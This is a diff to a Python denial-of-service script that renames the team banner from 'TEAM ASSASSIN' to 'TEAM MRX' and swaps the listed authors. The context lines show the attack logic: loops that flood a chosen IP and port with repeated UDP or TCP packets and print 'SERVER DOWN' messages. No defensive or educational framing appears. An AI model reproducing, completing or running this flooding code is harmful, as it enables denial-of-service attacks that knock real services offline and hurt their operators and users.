@@ -14,14 +14,14 @@ print("DDoS is Running in : "+platform.system())
 if platform.system() == 'Windows':
 
 	print("""
- TEAM ASSASSIN is Presenting to you :
+ TEAM MRX is Presenting to you :
 ▀▀█▀▀ ▒█▀▀▀ ░█▀▀█ ▒█▀▄▀█ 　 ░█▀▀█ ▒█▀▀▀█ 
 ░▒█░░ ▒█▀▀▀ ▒█▄▄█ ▒█▒█▒█ 　 ▒█▄▄█ ░▀▀▀▄▄ 
 ░▒█░░ ▒█▄▄▄ ▒█░▒█ ▒█░░▒█ 　 ▒█░▒█ ▒█▄▄▄█ """)
 else :
 	print("""
 	'\033[4;34m'
- TEAM ASSASSIN is Presenting to you :
+ TEAM MRX is Presenting to you :
 
 ▀▀█▀▀ ▒█▀▀▀ ░█▀▀█ ▒█▀▄▀█ 　 ░█▀▀█ ▒█▀▀▀█ 
 ░▒█░░ ▒█▀▀▀ ▒█▄▄█ ▒█▒█▒█ 　 ▒█▄▄█ ░▀▀▀▄▄ 
@@ -39,8 +39,8 @@ else :
 ┃┏━┓┃┃┗┓┃┗┫┏┓┃┗━┫┏┓┓
 ┗┛╋┗┛┗━┛┗━┻┛┗┻━━┻┛┗┛
 	
-	#AUTHOR : KARASKO 
-        #AUTHOR : madara x
+	#AUTHOR : SCP 
+        #AUTHOR : 9OCHI7A
 			""")
 
 
@@ -61,7 +61,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +"TEAM ASSASSIN TA9TA7EM!!!!")
+			print(i +"TEAM MRX TA9TA7EM!!!!")
 		except:
 			print("[!] SERVER DOWN!!!")
 
@@ -75,7 +75,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +"TEAM ASSASSI'' TA9TA7EM!!!!")
+			print(i +"TEAM MRX'' TA9TA7EM!!!!")
 		except:
 			s.close()
 			print("[*] SERVER DOWN")
